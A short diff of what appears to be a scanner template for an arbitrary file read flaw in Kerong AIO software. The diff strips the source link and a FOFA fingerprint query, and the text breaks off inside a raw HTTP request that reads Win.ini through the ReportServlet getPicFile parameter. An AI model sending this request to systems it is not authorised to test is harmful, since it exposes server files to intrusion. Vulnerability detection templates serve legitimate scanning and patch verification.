@@ -3,12 +3,8 @@ info:
   name: 科荣AIO 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mmp6if557odl4fml'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mmp6if557odl4fml
-    fofa: '"changeAccount(''8000'')"'
 http:
 - raw:
   - 'GET ReportServlet?operation=getPicFile&fileName=/DISKC/Windows/Win.ini HTTP/1.1
